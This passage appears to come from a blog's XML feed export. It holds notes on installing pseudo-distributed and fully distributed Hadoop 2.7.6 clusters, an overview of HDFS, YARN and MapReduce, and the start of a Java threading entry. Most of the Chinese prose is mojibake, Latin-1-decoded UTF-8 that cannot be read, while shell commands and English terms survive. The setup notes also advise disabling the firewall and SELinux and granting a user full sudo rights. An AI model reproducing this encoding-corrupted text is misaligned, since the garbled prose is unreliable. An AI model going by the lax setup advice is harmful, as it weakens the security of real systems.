ResourceManager 3401 DataNode 3306 NameNode 3836 NodeManager 3597 SecondaryNameNode é¡µé¢ï¼š hdfsï¼šnamenodeçš„ipï¼š50070 yarn:resourcemanagerçš„ipï¼š8088 æ–¹å¼2: å®Œå…¨åˆ†å¸ƒå¼å‚è€ƒæ–‡æ¡£ å„ä¸ªèŠ‚ç‚¹çš„å®‰è£…çš„æ™®é€šç”¨æˆ·åå¿…é¡»ç›¸åŒ å¯†ç ä¹Ÿå¾—ç›¸åŒ, æ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦æ“ä½œ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879æ­å»ºå‡†å¤‡ï¼š 1ï¼‰ipé…ç½® 2ï¼‰ä¸»æœºå vi /etc/sysconfig/network 3ï¼‰ä¸»æœºæ˜ å°„ 4ï¼‰å…³é—­é˜²ç«å¢™å’Œsellinux service iptables stop vi /etc/selinux/config SELINUX=disabled 5ï¼‰å°†ç³»ç»Ÿçš„å¯åŠ¨çº§åˆ«æ”¹ä¸º3 6ï¼‰åˆ›å»ºæ™®é€šç”¨æˆ·ï¼Œå¹¶ä¸ºæ™®é€šç”¨æˆ·æ·»åŠ sudolersæƒé™ åˆ›å»ºç”¨æˆ·ï¼šuseradd ç”¨æˆ·å passwd ç”¨æˆ·å vi /etc/sudoers hadoop ALL=(ALL) ALL 7ï¼‰é…ç½®å…å¯†ç™»å½• å…ˆåˆ‡æ¢åˆ°æ™®é€šç”¨æˆ· æ¯å°æœºå™¨éƒ½éœ€è¦æ‰§è¡Œä¸‹é¢çš„æ“ä½œ å„ä¸ªèŠ‚ç‚¹ä¹‹é—´éƒ½åšä¸€ä¸‹ a. ç”Ÿæˆç§˜é’¥ ssh-keygen b. å‘é€ç§˜é’¥ ssh-copy-id hadoop(ä¸»æœºå) c. éªŒè¯ï¼šå„ä¸ªèŠ‚ç‚¹ä¹‹é—´éƒ½éœ€è¦åšç›¸äº’éªŒè¯ ssh hadoop01 ssh hadoop02 ssh hadoop03 8ï¼‰å®‰è£…jdk å¸è½½jdkï¼š rpm -qa|grep jdk rpm -e java-1.7.0-openjdk-1.7.0.99-2.6.5.1.el6.x86_64 --nodeps 9ï¼‰æ—¶é—´åŒæ­¥ ä¼ªåˆ†å¸ƒå¼ä¸éœ€è¦ åˆ†å¸ƒå¼éœ€è¦ï¼Œå¿…é¡»åš 1)ä¸èƒ½è”ç½‘çš„æ—¶å€™ æ‰‹åŠ¨æŒ‡å®š date -s æ—¶é—´ æˆ–è€…æ‰‹åŠ¨æ­å»ºä¸€ä¸ªæ—¶é—´æœåŠ¡å™¨ 2ï¼‰èƒ½è”ç½‘çš„æ—¶å€™ æ‰¾ä¸€ä¸ªå…¬ç½‘ä¸­çš„å…¬ç”¨çš„æ—¶é—´æœåŠ¡å™¨ æ‰€æœ‰èŠ‚ç‚¹çš„æ—¶é—´å’Œå…¬ç½‘ä¸­çš„æ—¶é—´æœåŠ¡å™¨ä¿æŒä¸€è‡´ ntpdate å…¬ç½‘çš„æ—¶é—´æœåŠ¡å™¨åœ°å€ å®Œå…¨åˆ†å¸ƒå¼å¿…é¡»è¦åš æ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦æ‰§è¡Œ 10) é€‰æ‹©å®‰è£…ç‰ˆæœ¬ï¼š ä¸é€‰å¤ªé™ˆæ—§çš„ç‰ˆæœ¬ä¹Ÿä¸é€‰æœ€æ–°çš„ç‰ˆæœ¬ 2.7.6 11) å®‰è£… ä¸€å®šåˆ‡æ¢ç”¨æˆ· æ™®é€šç”¨æˆ· å…ˆåœ¨ä¸€ä¸ªèŠ‚ç‚¹ä¸Šæ‰§è¡Œæ‰€æœ‰çš„ä¿®æ”¹ åœ¨è¿œç¨‹å‘é€åˆ°å…¶ä»–èŠ‚ç‚¹ 1ï¼‰ä¸Šä¼  2ï¼‰è§£å‹d 3ï¼‰é…ç½®ç¯å¢ƒå˜é‡ 4ï¼‰ä¿®æ”¹é…ç½®æ–‡ä»¶ 6ä¸ªé…ç½®æ–‡ä»¶ é›†ç¾¤è§„åˆ’ .... .... 5)è¿œç¨‹å‘é€ scp -r hadoop-2.7.6 hadoop02:$PWD scp -r hadoop-2.7.6 hadoop03:$PWD scp -r /home/ap/apps/hadoop-2.7.6/etc/hadoop ap@cs1:/home/ap/apps/hadoop-2.7.6/etc è¿œç¨‹å‘é€/etc/pofile æ‰§è¡Œsource /etc/pofile 6ï¼‰è¿›è¡Œæ ¼å¼åŒ– å¿…é¡»åœ¨namenodeçš„èŠ‚ç‚¹ï¼ˆhdfsçš„ä¸»èŠ‚ç‚¹ï¼‰ hadoop namenode -format ä¸é…ç½®ç›®å½•é»˜è®¤/tmp ä¸´æ—¶ç›®å½• å¯ä»¥éšæ—¶å›æ”¶çš„ 7)å¯åŠ¨ å¯åŠ¨hdfs start-dfs.sh åœ¨ä»»æ„èŠ‚ç‚¹éƒ½å¯ä»¥ å¯åŠ¨yarn start-yarn.sh åœ¨yarnçš„ä¸»èŠ‚ç‚¹æ‰§è¡Œ jpså‘½ä»¤æŸ¥çœ‹ ç½‘é¡µï¼š hdfs: hadoop01:50070 yarn hadoop03:8088 8) å»æ‰è­¦å‘Šï¼ˆåœ¨/etc/profileæˆ–è€… .bash_profile æˆ–è€… .zshrcä¸­æ·»åŠ ï¼‰ export HADOOP_HOME_WARN_SUPPRESS=1 æµ‹è¯•yarné›†ç¾¤æ˜¯å¦å¯åŠ¨æˆåŠŸ (æäº¤MapReduceä¾‹å­ç¨‹åºè¯•è·‘) ls apps/hadoop-2.7.6/share/hadoop/mapreduce bin/hadoop jar hadoop-mapreduce-examples-2.6.5.jar pi 5 5 å¯èƒ½é‡åˆ°çš„é”™è¯¯æ­å»ºè¿‡ç¨‹ä¸­ ä¸»æœºæ‰¾ä¸åˆ° /etc/sysconfig/network /etc/hosts é‡å¯æœºå™¨ ä½•æ—¶åŒ–çš„æ—¶å€™æŠ¥é”™ é…ç½®æ–‡ä»¶é”™è¯¯, æ ¹æ®é”™è¯¯å»ç›¸åº”æ–‡ä»¶è¿›è¡Œè°ƒæ•´, ä¿®æ”¹å®Œæ¯•å, é‡æ–°æ ¼å¼åŒ–ç›´åˆ°æ ¼å¼åŒ–æˆåŠŸ å¯åŠ¨è¿‡ç¨‹ä¸­æŸäº›è¿›ç¨‹å¯åŠ¨ä¸äº†æªè¾1: æš´åŠ› å…¨éƒ¨å…³é—­é›†ç¾¤é‡æ–°å¯åŠ¨ stop-dfs.sh åœ¨ä»»æ„èŠ‚ç‚¹æ‰§è¡Œ stop-yarn.sh åœ¨yarnçš„ä¸»èŠ‚ç‚¹å¯åŠ¨ é‡æ–°å¯åŠ¨, ç›´æ¥å¯åŠ¨å°±å¯ä»¥äº† start-dfs.sh start-yarn.sh æªæ–½2: å•ç‹¬å¯åŠ¨æŸäº›è¿›ç¨‹å•ç‹¬å¯åŠ¨hdfsçš„ç›¸å…³è¿›ç¨‹ hadoop-daemon.sh start hdfs è¿‡ç¨‹ hadoop-daemon.sh start namenode hadoop-daemon.sh start secondarynamenode å•ç‹¬å¯åŠ¨yarnçš„ç›¸å…³å‘½ä»¤ yarn-daemon.sh start yarn çš„ç›¸å…³è¿‡ç¨‹ yarn-daemon.sh start resourcemanager ==æ­å»ºè¿‡ç¨‹ä¸­çš„æ³¨æ„äº‹é¡¹== é›†ç¾¤çš„åªèƒ½æˆåŠŸçš„æ ¼å¼åŒ–ä¸€æ¬¡, ä¸æˆåŠŸçš„è¦ä¸€ç›´åˆ°æ ¼å¼åŒ–æˆåŠŸ, æˆåŠŸåå°±ä¸èƒ½å†æ¬¡æ ¼å¼åŒ– æ ¼å¼åŒ–çš„è¿‡ç¨‹ä¸­: åˆ›å»ºå‡ºæ¥namenodeå­˜å‚¨çš„ç›¸å…³ç›®å½• versionæ–‡ä»¶: è®°å½•ä»ªé›†ç¾¤çš„ç‰ˆæœ¬ä¿¡æ¯çš„, æ¯æ ¼å¼åŒ–ä¸€æ¬¡, å°±ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„ç‰ˆæœ¬ä¿¡æ¯ 123456namespaceID=1163449973clusterID=CID-47f10077-2aef-4df6-a364-1a735515a100 #è®°å½•é›†ç¾¤çš„ç‰ˆæœ¬ä¿¡æ¯çš„cTime=0storageType=NAME_NODEblockpoolID=BP-1527239677-192.168.75.162-1527817150436layoutVersion=-63 å¯åŠ¨hdfsçš„æ—¶å€™: ç”Ÿæˆdatanodeçš„ç›¸å…³æ•°æ®ä¿¡æ¯ version: è®°å½•datanode ç›¸å…³ç‰ˆæœ¬çš„ä¿¡æ¯ 1clusterID=CID-47f10077-2aef-4df6-a364-1a735515a100 ä¸¤ä¸ªæ–‡ä»¶ä¸­çš„clusterIDç›¸åŒçš„æ—¶å€™, datanode æ‰ä¼šè®¤ä¸ºæ˜¯åŒä¸€ä¸ªé›†ç¾¤çš„ æƒ³è¦é‡å¤æ ¼å¼åŒ–, åˆ†3æ­¥èµ° åœæ­¢æ‰€æœ‰æœåŠ¡ åˆ é™¤ namenode çš„æ•°æ®ç›®å½• rm -rf /home/ap/data/hadoopdata/name åˆ é™¤ datanode çš„æ•°æ®ç›®å½• rm -rf /home/ap/data/hadoopdata/data æ­¤æ—¶æ‰å¯ä»¥é‡æ–°æ ¼å¼åŒ–, å¦åˆ™ä¼šé€ æˆ datanode å¯åŠ¨ä¸äº†, æ³¨æ„, å…³é—­é˜²ç«å¢™, å…³é—­vpn ä¹Ÿå¯ä»¥ä¸€æ­¥åˆ°ä½ rm -rf /home/ap/data å†é‡æ–°æ ¼å¼åŒ– é›†ç¾¤æ­å»ºè¿‡ç¨‹ä¸­ç¯å¢ƒå˜é‡çš„é…ç½®(jdk. hadoopâ€¦) åœ¨Linuxä¸­ä¿®æ”¹ç¯å¢ƒå˜é‡çš„åœ°æ–¹æœ‰3ä¸ª /etc/profile ç³»ç»Ÿç¯å¢ƒå˜é‡, é’ˆå¯¹æ‰€æœ‰ç”¨æˆ·çš„ ~/.bashrc ç”¨æˆ·ç¯å¢ƒå˜é‡ ~/.bash_profile ç”¨æˆ·ç¯å¢ƒå˜é‡ è¿™3ä¸ªé…ç½®æ–‡ä»¶çš„åŠ è½½é¡ºåº /etc/profile &gt; .bashrc &gt; .bash_profile ç”Ÿæ•ˆ: æœ€åä¸€æ¬¡åŠ è½½çš„ç”Ÿæ•ˆ æ—¶é—´åŒæ­¥é—®é¢˜ åªè¦æ˜¯å®Œå…¨åˆ†å¸ƒå¼çš„, å¤šä¸ªèŠ‚ç‚¹ä¹‹é—´ä¸€å®šè¦åšæ—¶é—´åŒæ­¥, ç›®çš„: è¦å’Œ åŒ—äº¬/ä¸Šæµ· æ—¶é—´ä¿æŒä¸€è‡´? no é›†ç¾¤èƒŒéƒ¨å„ä¸ªèŠ‚ç‚¹ä¹‹é—´æ—¶é—´ä¿æŒä¸€è‡´ yes why ? é›†ç¾¤å†…éƒ¨å„ä¸ªèŠ‚ç‚¹ä¹‹é—´éœ€è¦é€šä¿¡, å°¤å…¶æ˜¯datanode å’Œ namenodeä¹‹é—´, ä»–ä»¬ä¹‹é—´çš„é€šä¿¡ä¾é å¿ƒè·³æœºåˆ¶, ä»–ä»¬ä¹‹é—´çš„å¿ƒè·³å­˜åœ¨ä¸€ä¸ªæ—¶é—´æ§åˆ¶, è¿™ä¸ªæ—¶é—´æ˜¯ 630s, ä»–ä»¬ä¹‹å‰éœ€è¦åšæ—¶é—´åŒæ­¥ é›†ç¾¤çš„å®‰è£…æ¨¡å¼1. å•æœºæ¨¡å¼ ç›´æ¥è§£å‹çš„æ–¹å¼, ä»€ä¹ˆéƒ½ä¸é…ç½®, å¹¶ä¸”åœ¨ä¸€ä¸ªèŠ‚ç‚¹ä¸Š æ²¡æœ‰åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ, æ‰€æœ‰çš„æ–‡ä»¶éƒ½æ˜¯æ¥è‡ªæœ¬åœ°, åªèƒ½å¯¹æœ¬åœ°çš„æ–‡ä»¶è¿›è¡Œè¯»å†™ å‡ ä¹æ²¡äººç”¨, æµ‹è¯•æ—¶å¶å°”ä¼šç”¨ 2. ä¼ªåˆ†å¸ƒå¼ å¯ä»¥çœ‹åšè·‘åœ¨ä¸€ä¸ªèŠ‚ç‚¹ä¸Šçš„å®Œå…¨åˆ†å¸ƒå¼ æœ‰åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ, åªä¸è¿‡è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿåªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ ==3. å®Œå…¨åˆ†å¸ƒå¼==å‚è€ƒæ–‡æ¡£ è§„åˆ’ ç›®å‰ç–‘ç‚¹: NodeManageræ˜¯æ ¹æ®ä»€ä¹ˆé…ç½®åˆ°æ¯å°æœºå™¨ä¸Šçš„?? æ ¹æ®è¡¨å¾, å¯èƒ½æ˜¯æ ¹æ® slaveæ–‡ä»¶ ä¸»æœºå / IP HDFS YARN cts1 / 192.168.56.131 NameNode ç©ºçš„ cts2 / 192.168.56.132 DataNode NodeManager cts3 / 192.168.56.133 DataNode + Secondary NameNode NodeManager cts4 / 192.168.56.134 DataNode NodeManager +ResourceManager hdfs ä¸ºä¾‹ : åœ¨å®è§‚çœ‹å°±æ˜¯ä¸€ä¸ªå¤§çš„èŠ‚ç‚¹, åå°é‡‡ç”¨çš„ç¡¬ä»¶é…ç½®æ˜¯ä¸‰å¤©æœºå™¨çš„ç¡¬ä»¶é…ç½®ä¹‹å’Œ, ä½†æ˜¯å¯¹ç”¨æˆ·æ¥è®²å®Œå…¨æ„Ÿè§‰ä¸åˆ° åœ¨å®Œå…¨åˆ†å¸ƒå¼ä¸­, æœ‰ä¸»èŠ‚ç‚¹, æœ‰ä»èŠ‚ç‚¹ ä¸»èŠ‚ç‚¹ namenodeåªæœ‰ä¸€ä¸ª, ä»èŠ‚ç‚¹æœ‰å¤šä¸ª, çœŸå®ç”Ÿäº§ä¸­, namenodeä¼šå•ç‹¬åšä¸€ä¸ªèŠ‚ç‚¹ å¦‚æœé›†ç¾¤ä¸­namenodeå®•æœº, æ•´ä¸ªé›†ç¾¤è¿˜å¯ä»¥ä½¿ç”¨å—? ä¸å¯ä»¥ namenode: ä¸»è¦ä½œç”¨å­˜å‚¨å…ƒæ•°æ® (ç®¡ç†æ•°æ®çš„æ•°æ®, å­˜å‚¨çš„å°±æ˜¯datanodeå­˜å‚¨æ•°æ®çš„æè¿°) datanode: è´Ÿè´£é›†ç¾¤ä¸­çœŸæ­£å¤„ç†æ•°æ®å­˜å­˜å‚¨çš„ å¦‚æœnamenode å®•æœº, é›†ç¾¤æ— æ³•ä½¿ç”¨, è¿™ä¹Ÿæ˜¯å®Œå…¨åˆ†å¸ƒå¼çš„ä¸€å¤§ç¼ºç‚¹, å­˜åœ¨å•ç‚¹æ•…éšœé—®é¢˜ ä¸€èˆ¬ç”Ÿäº§ä¸­ä¸å¤ªä½¿ç”¨, å­¦ä¹ , æµ‹è¯•, èŠ‚ç‚¹ä¸ªæ•°æ¯”è¾ƒå°‘çš„æ—¶å€™, æœ‰æ—¶å€™ä¹Ÿä¼šä½¿ç”¨è¿™ç§æ¨¡å¼ èŠ‚ç‚¹æ•°ç›®è¶Šå¤š, namenodeå®•æœºçš„å¯èƒ½æ€§è¶Šå¤§, å‹åŠ›å¤ªå¤§ åŠ©ç†secondarynamenode: åªæ˜¯ä¸€ä¸ªåŠ©ç†, åªæ˜¯åˆ†æ‹…namenodeçš„å‹åŠ›, ä½†æ˜¯ä¸èƒ½ä»£æ›¿ æ¶æ„: ä¸€ä¸»å¤šä» ==4. é«˜å¯ç”¨== æ¦‚å¿µ: é›†ç¾¤å¯ä»¥æŒç»­å¯¹å¤–æä¾›æœåŠ¡, åšåˆ° 7*24 å°æ—¶ä¸é—´æ–­ ä¾èµ–äºzookeeper, æ­å»ºæ”¾åœ¨ zookeeperè¯¾ç¨‹ä¹‹å é›†ç¾¤æ¶æ„: åŒä¸»å¤šä» æœ‰2ä¸ª namenode, ä½†æ˜¯åœ¨åŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ªæ˜¯ æ´»è·ƒçš„ namenode, æˆ‘ä»¬æŠŠè¿™ä¸ªæ´»è·ƒçš„namenode æˆä¸º active çš„, å¦å¤–ä¸€ä¸ªæ˜¯å¤„ç†çƒ­å¤‡ä»½çŠ¶æ€, æˆ‘ä»¬å°†è¿™ä¸ªèŠ‚ç‚¹å« standby, ä½†æ˜¯2ä¸ªä¸»èŠ‚ç‚¹å­˜å‚¨çš„å…ƒæ•°æ®æ˜¯ä¸€æ¨¡ä¸€æ ·çš„, å½“ active namenodeå®•æœºçš„æ—¶å€™, standbyçš„namenode å¯ä»¥ç«‹é©¬åˆ‡æ¢ä¸º active çš„namenode, å¯¹å¤–æä¾›æœåŠ¡, å°±å¯ä»¥åšåˆ° é›†ç¾¤æŒç»­å¯¹å¤–æä¾›æœåŠ¡çš„åŠŸèƒ½ å¦‚æœè¿‡ä¸€æ®µæ—¶é—´, å®•æœºçš„ namenode åˆæ´»è¿‡æ¥äº†, å®•æœºçš„ namenode åªèƒ½æ˜¯å˜æˆ standby çš„ ç¼ºé™·: åœ¨åŒä¸€æ—¶é—´ä¸­, é›†ç¾¤ä¸­åªæœ‰ä¸€ä¸ªactive çš„ namenode, ä¹Ÿå°±æ˜¯è¯´ é›†ç¾¤ä¸­æœ‰ä¸»èŠ‚ç‚¹èƒ½åŠ›çš„èŠ‚ç‚¹ åªæœ‰ä¸€ä¸ª, å¦‚æœé›†ç¾¤ä¸­, èŠ‚ç‚¹ä¸ªæ•°è¿‡å¤š(1000) çš„æ—¶å€™, ä¼šé€ æˆnamenodeçš„å´©æºƒ, namenodeå­˜å‚¨çš„æ˜¯å…ƒæ•°æ®, å…ƒæ•°æ®è¿‡å¤šçš„æ—¶å€™, ä¼šé€ æˆnamenodeçš„å´©æºƒ(ä¸¤ä¸ªéƒ½å´©æºƒ), æ²¡æœ‰çœŸæ­£çš„åˆ†æ‹…namenode çš„å‹åŠ› å®é™…ç”Ÿäº§å¤šä½¿ç”¨é«˜å¯ç”¨ 5. è”é‚¦æœºåˆ¶ åŒä¸€ä¸ªé›†ç¾¤ä¸­å¯ä»¥æœ‰å¤šä¸ªä¸»èŠ‚ç‚¹, è¿™äº›ä¸»èŠ‚ç‚¹çš„åœ°ä½æ˜¯ä¸€æ ·çš„. åŒä¸€æ—¶é—´, å¯ä»¥æœ‰å¤šä¸ªæ´»è·ƒçš„ namenode è¿™äº› namenode å…±åŒä½¿ç”¨é›†ç¾¤ä¸­æ‰€æœ‰çš„ datanode, æ¯ä¸ªnamenode åªè´Ÿè´£ç®¡ç†é›†ç¾¤ä¸­çš„ datanodeä¸Šçš„ä¸€éƒ¨åˆ†æ•°æ® ä¸€èˆ¬è¶…å¤§é›†ç¾¤æ­å»ºçš„æ—¶å€™: è”é‚¦ + é«˜å¯ç”¨ è¶…å¤§é›†ç¾¤ä½¿ç”¨ æ¯ä¸ªnamenodeè¿›è¡Œæ•°æ®ç®¡ç†é çš„Block Pool IDç›¸åŒ ä¸åŒçš„namenodeç®¡ç†çš„æ•°æ®Block Pool ID ä¸åŒ]]></content>
      <categories>
        <category>Hadoop</category>
        <category>hadoop</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoopä½“ç³»æ¦‚è§ˆ]]></title>
    <url>%2F2018%2F05%2F31%2FHadoop%2F0-Hadoop%2FHadoop%E4%BD%93%E7%B3%BB%E6%A6%82%E8%A7%88%2F</url>
    <content type="text"><![CDATA[Hadoopæ ¸å¿ƒç»„ä»¶æ•´ä½“ç›´è§‚æ¦‚è§ˆ 1. åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»ŸHDFS1.1 åŸºæœ¬æ¦‚å¿µ å°†æ–‡ä»¶åˆ‡åˆ†æˆæŒ‡å®šå¤§å°çš„æ•°æ®å—å¹¶ä»¥å¤šå‰¯æœ¬çš„å­˜å‚¨å½¢å¼å­˜å‚¨åœ¨å¤šä¸ªæœºå™¨ä¸Š æ•°æ®åˆ‡åˆ†, å¤šå‰¯æœ¬, å®¹é”™ç­‰æ“ä½œå¯¹ç”¨æˆ·æ˜¯é€æ˜çš„ 1.2 å›¾ç¤º 1.3 HDFSæ¶æ„ Datanode å®šæœŸå‘ Namenode å‘ Hearbeat å…ƒæ•°æ®ä¿¡æ¯ï¼š å¤šä»½å¤‡ä»½ 1.4 HDFSçš„ IO æ“ä½œ ä¸Šé¢çš„æ˜¯è¯» å®¢æˆ·ç«¯å…ˆå‘ NameNode å¯»å€ ç„¶åå†æ‰¾ DataNode æ‹¿æ•°æ® ä¸‹é¢çš„æ˜¯å†™ HDFS ä¸æ”¯æŒä¿®æ”¹ï¼Œ æ²¡æœ‰ leader è§’è‰²ï¼Œ ä¸æ”¯æŒå¹¶å‘å†™ï¼Œ åªèƒ½æ”¯æŒéå¹¶å‘çš„è¿½åŠ  HBase æ”¯æŒå¹¶å‘å†™å’Œä¿®æ”¹ åˆ é™¤ï¼š åˆ é™¤çš„æ˜¯å…ƒæ•°æ®ï¼ˆç´¢å¼•ä¿¡æ¯ï¼‰ Datanode ä¼šå®šæœŸå‘ Namenode å‘é€å¿ƒè·³ï¼Œ åŒæ­¥ä¿¡æ¯ï¼Œ å½“ Namenode å‘ç° Datanode ä¸Šæ²¡æœ‰è‡ªå·±å­˜å‚¨çš„ä¿¡æ¯æ—¶ï¼Œå°±ä¼šæŠŠè¿™éƒ¨åˆ†ä¿¡æ¯åˆ é™¤æ‰ã€‚ 1.5 HDFS å‰¯æœ¬å­˜æ”¾ç­–ç•¥ å¤åˆ¶å› å­ä¸º3æ—¶çš„ å­˜æ”¾ç­–ç•¥ å¦‚æœå†™å…¥è€…åœ¨ä¸€ä¸ª datanode ä¸Šï¼Œ åˆ™æŠŠä¸€ä»½æ‹·è´æ”¾åœ¨æœ¬åœ°æœºå™¨ä¸Šï¼Œ å¦åˆ™éšæœºæ”¾åˆ°ä¸€ä¸ª datande ä¸Š å¦ä¸€ä¸ªå‰¯æœ¬æ”¾åœ¨ä¸åŒçš„ï¼ˆè¿œç¨‹ï¼‰æœºæ¶çš„èŠ‚ç‚¹ä¸Šï¼Œ æœ€åä¸€ä¸ªå‰¯æœ¬å­˜æ”¾åœ¨åŒä¸€ä¸ªæœºæ¶çš„ä¸åŒèŠ‚ç‚¹ä¸Š è¿™ä¸€ç­–ç•¥å‰Šå‡äº†æœºæ¶é—´çš„å†™å…¥æµé‡ï¼Œé€šå¸¸æé«˜äº†å†™å…¥æ€§èƒ½ å¤åˆ¶å› å­å¤§äº3ï¼Œ åˆ™éšæœºç¡®å®šç¬¬4ä¸ªå’Œå…¶å®ƒçš„å‰¯æœ¬ä½ç½®ï¼ŒåŒæ—¶å°†æ¯ä¸ªæ‹·è´çš„æ•°ç›®ä¿æŒåœ¨ä¸Šé™ä»¥ä¸‹(åŸºæœ¬ä¸Šæ˜¯(å‰¯æœ¬æ•° - 1) / racks + 2)ã€‚ 2. èµ„æºè°ƒåº¦ç³»ç»Ÿ YARN2.1 åŸºæœ¬æ¦‚å¿µ YARN: Yet Another Resource Negotiator è´Ÿè´£æ•´ä¸ªé›†ç¾¤èµ„æºçš„ç®¡ç†å’Œè°ƒåº¦ YAENç‰¹ç‚¹: æ‰©å±•æ€§ &amp; å®¹é”™æ€§ &amp; å¤šæ¡†æ¶èµ„æºç»Ÿä¸€è°ƒåº¦ 2.2 å›¾ç¤º 3. åˆ†å¸ƒå¼è®¡ç®—æ¡†æ¶ MapReduce3.1 åŸºæœ¬æ¦‚å¿µ æºäºGoogleçš„MapReduceè®ºæ–‡, è®ºæ–‡å‘è¡¨äº2004å¹´12æœˆ MapReduceæ˜¯Google MapReduceçš„å…‹éš†ç‰ˆ MapReduceçš„ç‰¹ç‚¹: æ‰©å±•æ€§ &amp; å®¹é”™æ€§ &amp; æµ·é‡æ•°æ®ç¦»çº¿å¤„ç† 3.2 å›¾ç¤º Hadoopä¼˜åŠ¿1. é«˜å¯é æ€§ æ•°æ®å­˜å‚¨: æ•°æ®å—å¤šå‰¯æœ¬ æ•°æ®è®¡ç®—: é‡æ–°è°ƒåº¦ä½œä¸šè®¡ç®— 2. é«˜æ‰©å±•æ€§ å­˜å‚¨/è®¡ç®—èµ„æºä¸å¤Ÿæ—¶, å¯ä»¥æ¨ªå‘çš„çº¿æ€§æ‰©å±•æœºå™¨ ä¸€ä¸ªé›†ç¾¤ä¸­å¯ä»¥åŒ…å«æ•°ä»¥åƒè®¡çš„èŠ‚ç‚¹ 3. å…¶å®ƒ å­˜å‚¨åœ¨å»‰ä»·æœºå™¨ä¸Š, é™ä½æˆæœ¬ æˆç†Ÿçš„ç”Ÿæ€åœˆ Hadoopçš„å‘å±•å²è§æ–‡ç« : Hadoopåå¹´è§£è¯»ä¸å‘å±•é¢„æµ‹ Hadoopå®˜ç½‘ Hadoopç”Ÿæ€ç³»ç»Ÿ1. å›¾ç¤º 2. ç‰¹ç‚¹ å¼€æº, ç¤¾åŒºæ´»è·ƒ å›Šæ‹¬äº†å¤§æ•°æ®å¤„ç†çš„æ–¹æ–¹é¢é¢ æˆç†Ÿçš„ç”Ÿæ€åœˆ Hadoopå¸¸ç”¨å‘è¡Œç‰ˆåŠé€‰å‹ Apache Hadoop CDH : Cloudera Distributed Hadoop ï¼ˆå›½å†…ç”¨çš„æ¯”è¾ƒå¤šï¼‰ HDP : Hortonworks Data Platform ä½¿ç”¨: CDHä½¿ç”¨å æ¯” 60-70 hadoop: hadoop-2.6.0-cdh5.7.0 hive : hive-1.1.0-cdh5.7.0]]></content>
      <categories>
        <category>Hadoop</category>
        <category>hadoop</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaåŸºç¡€å¢å¼º-2 å¹¶å‘ç¼–ç¨‹]]></title>
    <url>%2F2018%2F05%2F30%2FJava%2FMyStudy%2FJava%E5%9F%BA%E7%A1%80%E5%A2%9E%E5%BC%BA-2%2F</url>
    <content type="text"><![CDATA[1. å¤šçº¿ç¨‹åŸºæœ¬çŸ¥è¯†1.1 å¤šçº¿ç¨‹è¿è¡Œçš„åŸç† åŸç†ï¼šCPU åœ¨çº¿ç¨‹ä¸­åšæ—¶é—´ç‰‡çš„åˆ‡æ¢ã€‚ ä¸€ä¸ª(å¤šæ ¸ä¸­çš„ä¸€ä¸ª) CPU åœ¨åœ¨è¿è¡Œç¨‹åºçš„è¿‡ç¨‹ä¸­æŸä¸ªæ—¶åˆ»ç‚¹ä¸Šï¼Œåªèƒ½è¿è¡Œä¸€ä¸ªç¨‹åºã€‚è€Œ CPU å¯ä»¥åœ¨ å¤šä¸ªç¨‹åºä¹‹é—´è¿›è¡Œé«˜é€Ÿçš„åˆ‡æ¢ (è½®è¯¢åˆ¶)ã€‚è€Œåˆ‡æ¢é¢‘ç‡å’Œé€Ÿåº¦å¤ªå¿«ï¼Œå¯¼è‡´äººçš„è‚‰çœ¼çœ‹ä¸åˆ°ã€‚ 1.2 å®ç°çº¿ç¨‹çš„ä¸¤ç§æ–¹å¼ ç»§æ‰¿ Thread å£°æ˜å®ç°Runnableæ¥å£ è¿˜å¯ä»¥å®ç°Callableæ¥å£ 1.3 çº¿ç¨‹çš„çŠ¶æ€å›¾è§£ æ–°å»ºçŠ¶æ€ï¼ˆNewï¼‰ï¼šæ–°åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹å¯¹è±¡ã€‚ å°±ç»ªçŠ¶æ€ï¼ˆRunnableï¼‰ï¼šçº¿ç¨‹å¯¹è±¡åˆ›å»ºåï¼Œå…¶ä»–çº¿ç¨‹è°ƒç”¨äº†è¯¥å¯¹è±¡çš„ start()æ–¹æ³•ã€‚è¯¥çŠ¶æ€ çš„çº¿ç¨‹ä½äºå¯è¿è¡Œçº¿ç¨‹æ± ä¸­ï¼Œå˜å¾—å¯è¿è¡Œï¼Œç­‰å¾…è·å– CPU çš„ä½¿ç”¨æƒã€‚ è¿è¡ŒçŠ¶æ€ï¼ˆRunningï¼‰ï¼šå°±ç»ªçŠ¶æ€çš„çº¿ç¨‹è·å–äº† CPUï¼Œæ‰§è¡Œç¨‹åºä»£ç ã€‚ é˜»å¡çŠ¶æ€ï¼ˆBlockedï¼‰ï¼šé˜»å¡çŠ¶æ€æ˜¯çº¿ç¨‹å› ä¸ºæŸç§åŸå› æ”¾å¼ƒ CPU ä½¿ç”¨æƒï¼Œæš‚æ—¶åœæ­¢è¿è¡Œã€‚ ç›´åˆ°çº¿ç¨‹è¿›å…¥å°±ç»ªçŠ¶æ€ï¼Œæ‰æœ‰æœºä¼šè½¬åˆ°è¿è¡ŒçŠ¶æ€ã€‚é˜»å¡çš„æƒ…å†µåˆ†ä¸‰ç§ï¼š ç­‰å¾…é˜»å¡ï¼šè¿è¡Œçš„çº¿ç¨‹æ‰§è¡Œ wait()æ–¹æ³•ï¼ŒJVM ä¼šæŠŠè¯¥çº¿ç¨‹æ”¾å…¥ç­‰å¾…æ± ä¸­ã€‚(wait ä¼šé‡Š æ”¾æŒæœ‰çš„é”) 